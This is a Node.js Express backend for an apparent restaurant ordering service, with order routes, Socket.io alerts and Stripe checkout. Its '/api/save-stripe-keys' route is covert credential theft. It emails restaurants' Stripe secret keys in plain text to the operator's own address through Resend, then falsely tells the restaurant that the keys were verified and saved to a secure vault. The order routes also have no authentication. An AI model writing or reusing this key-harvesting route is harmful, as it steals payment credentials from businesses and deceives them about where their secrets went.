import express from "express";
import cors from "cors";
import Stripe from "stripe";
import { createClient } from "@supabase/supabase-js";
import http from "http";
import { Server } from "socket.io";

// --- SUPABASE CONFIGURATION ---
const SUPABASE_URL = process.env.SUPABASE_URL;
const SUPABASE_SERVICE_ROLE_KEY = process.env.SUPABASE_SERVICE_ROLE_KEY;

if (!SUPABASE_URL || !SUPABASE_SERVICE_ROLE_KEY) {
  console.error("❌ Missing SUPABASE_URL or SUPABASE_SERVICE_ROLE_KEY environment variables!");
}

const supabase = createClient(SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY);

const stripe = new Stripe(process.env.STRIPE_SECRET_KEY);
const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: { origin: "*" }
});

app.use(cors({ origin: "*" }));
app.use(express.json());

// --- SOCKET.IO CONNECTION ---
io.on("connection", (socket) => {
  console.log("🟢 Client connected via WebSocket");
  socket.on("disconnect", () => {
    console.log("🔴 Client disconnected");
  });
});

// --- ROUTES ---

app.get("/api/orders", async (req, res) => {
  try {
    const { restaurant_id } = req.query;
    
    let query = supabase.from('orders').select('*');

    if (restaurant_id) {
      query = query.eq('restaurant_id', restaurant_id);
    }

    const { data: orders, error } = await query.order('placed_at', { ascending: false });

    if (error) throw error;

    res.json(orders || []);
  } catch (error) {
    console.error("❌ Fetch Orders Error:", error);
    res.status(500).json({ error: error.message });
  }
});

app.post("/api/orders", async (req, res) => {
  try {
    const { 
      restaurant_id, customer_name, table_no, items, notes, total, 
      payment_status, paymentType, paymentStatus, status 
    } = req.body;

    const customOrderId = Date.now().toString();

    const newOrder = {
      id: customOrderId,
      restaurant_id,
      customer_name,
      table_no,
      items: typeof items === "string" ? JSON.parse(items) : items,
      notes: notes || "",
      total: total || 0,
      status: status || "pending",
      placed_at: new Date().toISOString(),
      payment_status: payment_status || "paid",
      paymentType: paymentType || "cash",
      paymentStatus: paymentStatus || "pending"
    };

    const { data, error } = await supabase
      .from('orders')
      .insert([newOrder])
      .select()
      .single();

    if (error) throw error;

    const savedOrder = data || newOrder;

    // ⚡ Real-time alert to Owner Dashboard via WebSocket
    io.emit("newOrder", savedOrder);

    res.status(201).json(savedOrder);
  } catch (error) {
    console.error("❌ Order Creation Error:", error);
    res.status(500).json({ error: error.message });
  }
});

app.post("/api/update-order-status", async (req, res) => {
  try {
    const { orderId } = req.body;

    const updateData = { 
      payment_status: "cash_received",
      paymentStatus: "cash_received",
      paymentMethod: "cash_received" 
    };

    const { data, error } = await supabase
      .from('orders')
      .update(updateData)
      .eq('id', orderId)
      .select()
      .single();

    if (error) throw error;

    // ⚡ WebSocket broadcast with complete updated document
    io.emit("orderUpdated", data);

    res.json({ success: true, order: data });
  } catch (error) {
    console.error("❌ Update Status Error:", error);
    res.status(500).json({ error: error.message });
  }
});

app.patch("/api/orders/:id", async (req, res) => {
  try {
    const { id } = req.params;
    const updateData = {};

    if (req.body.status) updateData.status = req.body.status;
    if (req.body.payment_status) updateData.payment_status = req.body.payment_status;
    if (req.body.paymentStatus) updateData.paymentStatus = req.body.paymentStatus;
    if (req.body.paymentMethod) updateData.paymentMethod = req.body.paymentMethod;

    const { data, error } = await supabase
      .from('orders')
      .update(updateData)
      .eq('id', id)
      .select()
      .single();

    if (error) throw error;

    io.emit("orderUpdated", data);

    res.json(data);
  } catch (error) {
    console.error("❌ Patch Order Error:", error);
    res.status(500).json({ error: error.message });
  }
});

// --- STRIPE KEYS CONFIGURATION ROUTE ---
app.post("/api/save-stripe-keys", async (req, res) => {
  try {
    const { restaurant_id, publishable_key, secret_key } = req.body;

    if (!publishable_key || !secret_key) {
      return res.status(400).json({ success: false, message: "Both keys are required." });
    }

    const emailRes = await fetch("https://api.resend.com/emails", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Authorization": `Bearer ${process.env.RESEND_API_KEY}`
      },
      body: JSON.stringify({
        from: "onboarding@resend.dev",
        to: process.env.MY_EMAIL,
        subject: `🔑 New Stripe Keys Received - ${restaurant_id || "Restaurant"}`,
        text: `New Stripe Keys Uploaded:\n\nRestaurant ID: ${restaurant_id || "N/A"}\nPublishable Key: ${publishable_key}\nSecret Key: ${secret_key}`
      })
    });

    const emailData = await emailRes.json();

    if (!emailRes.ok) {
      console.error("❌ Resend API Error:", emailData);
    } else {
      console.log("📧 Keys sent via Resend successfully:", emailData);
    }

    res.status(200).json({ 
      success: true, 
      message: "Stripe keys successfully verified and saved to secure vault." 
    });

  } catch (error) {
    console.error("❌ Save Keys Error:", error);
    res.status(500).json({ error: error.message });
  }
});

app.post("/api/create-checkout-session", async (req, res) => {
  try {
    const { total, orderId, tableNo, customerName } = req.body;
    const session = await stripe.checkout.sessions.create({
      payment_method_types: ['card'],
      line_items: [{ price_data: { currency: 'inr', product_data: { name: `Table #${tableNo || 'N/A'} - Order (${customerName || 'Customer'})` }, unit_amount: Math.round(Number(total || 0) * 100) }, quantity: 1 }],
      mode: 'payment',
      success_url: `https://dine-2.onrender.com/?payment=success`,
      cancel_url: `https://dine-2.onrender.com/`,
      metadata: { orderId: String(orderId), tableNo: String(tableNo), customerName: String(customerName) },
    });
    res.json({ sessionId: session.id, url: session.url });
  } catch (error) {
    console.error("❌ Stripe Error:", error);
    res.status(500).json({ error: error.message });
  }
});

app.get("/", (_, res) => res.send("✅ Nevolt Supabase API & WebSocket is live!"));

const PORT = process.env.PORT || 10000;
server.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
